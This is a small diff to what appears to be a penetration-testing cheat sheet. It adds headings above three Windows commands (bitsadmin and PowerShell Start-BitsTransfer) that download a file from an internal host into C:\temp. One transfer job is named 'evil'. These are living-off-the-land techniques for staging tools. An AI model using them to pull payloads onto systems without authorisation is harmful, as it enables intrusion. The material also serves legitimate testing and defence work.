@@ -131,8 +131,12 @@ USING BITSADMIN -
     
     bitsadmin /transfer n http://10.10.10.10/demo.txt C:\temp\demo.txt
 
+**Web Content Download**
+    
     bitsadmin /transfer evil /download /priority high http://10.10.10.10:80/demo.txt c:\temp\demo.txt
 
+**Web Content Download**
+    
     powershell.exe -c Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.10/demo.txt" -Destination "C:\temp\demo.txt"
 ------------------------------------------------------------------------------------------------------------------
 
